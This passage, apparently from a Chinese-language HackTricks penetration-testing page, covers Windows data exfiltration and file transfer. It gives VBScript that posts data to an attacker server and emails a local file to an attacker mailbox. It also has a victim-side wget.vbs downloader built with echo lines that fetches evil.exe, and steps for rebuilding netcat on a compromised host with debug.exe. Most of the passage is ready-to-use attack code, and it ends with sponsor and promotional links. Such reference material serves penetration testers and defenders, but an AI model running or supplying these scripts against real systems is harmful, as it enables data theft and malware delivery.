VBScript还可以通过网络传输将数据发送到攻击者的服务器。这可以通过使用`MSXML2.XMLHTTP`对象来实现。攻击者可以编写VBScript脚本来将数据发送到指定的URL，并在服务器端进行处理。

```vbscript
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "POST", "http://attacker-server.com/receive.php", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "data=secretdata"
```

### 3. 电子邮件传输

VBScript还可以通过电子邮件将数据发送到攻击者的邮箱。这可以通过使用`CDO.Message`对象来实现。攻击者可以编写VBScript脚本来创建一个邮件对象，并将数据作为附件发送到指定的邮箱。

```vbscript
Set objMessage = CreateObject("CDO.Message")
objMessage.Subject = "Sensitive Data"
objMessage.From = "sender@example.com"
objMessage.To = "attacker@example.com"
objMessage.TextBody = "Please find the attached sensitive data."
objMessage.AddAttachment "C:\path\to\file.txt"
objMessage.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objMessage.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
objMessage.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objMessage.Configuration.Fields.Update
objMessage.Send
```

以上是VBScript中常用的几种数据泄露方法。攻击者可以根据具体情况选择合适的方法来实现数据的传输和泄露。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**受害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

这是一种适用于 Windows 32 位机器的疯狂技术。思路是使用 `debug.exe` 程序。它用于检查二进制文件，就像一个调试器。但它也可以从十六进制重新构建它们。所以我们的想法是，我们拿到二进制文件，比如 `netcat`。然后将其反汇编为十六进制，在受损的机器上将其粘贴到一个文件中，然后使用 `debug.exe` 进行汇编。

`Debug.exe` 只能汇编 64 kb 的文件。所以我们需要使用小于该大小的文件。我们可以使用 upx 进一步压缩它。所以让我们这样做：
```
upx -9 nc.exe
```
现在它只有29 kb。完美。现在让我们对其进行反汇编：
```
wine exe2bat.exe nc.exe nc.txt
```
现在我们只需将文本复制粘贴到我们的Windows shell中。它将自动创建一个名为nc.exe的文件

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便您可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
